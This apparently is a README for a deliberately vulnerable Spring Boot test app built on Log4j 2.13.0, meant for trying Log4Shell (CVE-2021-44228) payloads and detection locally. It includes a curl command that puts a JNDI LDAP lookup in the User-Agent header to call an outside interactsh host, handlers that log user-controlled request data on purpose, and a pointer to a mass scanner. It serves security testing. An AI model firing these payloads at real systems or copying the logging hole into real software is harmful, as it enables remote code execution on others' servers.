# CVE-2021-44228 Vuln App

[![Dockerfile](https://github.com/ahmad4fifz/CVE-2021-44228-vuln-app/actions/workflows/build.yml/badge.svg)](https://github.com/ahmad4fifz/CVE-2021-44228-vuln-app/actions/workflows/build.yml)

This is a dirty hack spring boot hello world proejct to test your tooling/payloads/detection capabilities locally before you hit production targets with them.

The configured Log4j version is 2.13.0

## Building the docker image
```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 --name vulnerable-app vulnerable-app
```

## Testing / Triggering CVE-2021-44228
If you don't have burp collaborator running in the garage, you can visit this site to get a similar experience: https://interactsh.com

```bash
curl -s --max-time 20 localhost:8080 -H 'User-Agent: ${jndi:ldap://<some_custom_identifier>.<your_generated_subdomain>.interactsh.com/a}' > /dev/null
```

### Scanner tool
Optionall you can use this awesome repo for performing local/mass scanning: https://github.com/adilsoybali/Log4j-RCE-Scanner

### Trigger locations
This vulnerability is all about forcing a user controlled value to be logged by the vulnerable logging framework. With this in mind this simple dummy application supports two HTTP (GET/PUT) verbs and a bunch of injection locations:

```java
@GetMapping("/")
	public String index(HttpServletRequest request) {
		logger.info("Request URL: " + request.getRequestURL());
		logger.info("Request URI: " + request.getRequestURI());
		logger.info("Request Method: " + request.getMethod());
		logger.info("Request Query String: " + request.getQueryString());
		logger.info("Request Protocol: " + request.getProtocol());
		logger.info("Request Remote Address: " + request.getRemoteAddr());
		logger.info("Request Remote Host: " + request.getRemoteHost());
		logger.info("Request Remote Port: " + request.getRemotePort());
		logger.info("Request User Agent: " + request.getHeader("User-Agent"));
		return "Log4J2 is working!";
	}
```

```java
@PostMapping("/")
	public String post(HttpServletRequest request, @RequestBody String body) {
		logger.info("Request URL: " + request.getRequestURL());
		logger.info("Request URI: " + request.getRequestURI());
		logger.info("Request Method: " + request.getMethod());
		logger.info("Request Query String: " + request.getQueryString());
		logger.info("Request Protocol: " + request.getProtocol());
		logger.info("Request Remote Address: " + request.getRemoteAddr());
		logger.info("Request Remote Host: " + request.getRemoteHost());
		logger.info("Request Remote Port: " + request.getRemotePort());
		logger.info("Request User Agent: " + request.getHeader("User-Agent"));
		logger.info("Request Body: " + body); // mind the extra request body
		return "Log4J2 is working!";
	}
```

Contribution / improvements are welcome.

Sorry for code quality :) this project is not for showoff but to share/help.